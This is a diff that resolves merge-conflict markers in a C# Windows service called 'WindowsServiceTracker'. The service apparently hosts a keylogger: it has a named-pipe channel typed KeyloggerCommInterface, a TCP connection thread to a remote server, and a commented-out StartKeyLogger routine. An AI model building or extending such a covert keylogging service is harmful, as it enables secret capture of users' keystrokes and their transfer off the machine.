@@ -37,14 +37,11 @@ namespace WindowsServiceTracker
         private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
         private volatile TcpClient tcp;
         private NetworkStream tcpStream;
-<<<<<<< HEAD
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeReverse"));
         private KeyloggerCommInterface pipeProxy;
-=======
         private Thread tcpThread;
         private volatile bool tcpKeepAlive = true;
->>>>>>> cffb9bff092879836386fd87155b3d2350271a46
 
         //private Keylogger keylog = new Keylogger();
 
@@ -72,11 +69,7 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
-<<<<<<< HEAD
-
-=======
             //StartKeyLogger();
->>>>>>> cffb9bff092879836386fd87155b3d2350271a46
         }
 
         protected override void OnStop()
@@ -117,9 +110,6 @@ namespace WindowsServiceTracker
             EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
         }
 
-<<<<<<< HEAD
-        /*private bool StartKeyLogger() //todo exception handling
-=======
         //make a thread based on this method to connect to the server and read/write to the tcp connection
         private void MaintainServerConnection()
         {
@@ -163,7 +153,6 @@ namespace WindowsServiceTracker
 
         /*
         private bool StartKeyLogger() //todo exception handling
->>>>>>> cffb9bff092879836386fd87155b3d2350271a46
         {
             if (keyLogger != null && keyLogger.Responding)
             {
@@ -192,12 +181,7 @@ namespace WindowsServiceTracker
                 keyLogger.Kill(); //todo explore better/safer options
             }
             return true;
-<<<<<<< HEAD
         }*/
-=======
-        }
-        */
->>>>>>> cffb9bff092879836386fd87155b3d2350271a46
 
         private bool Connect()
         {
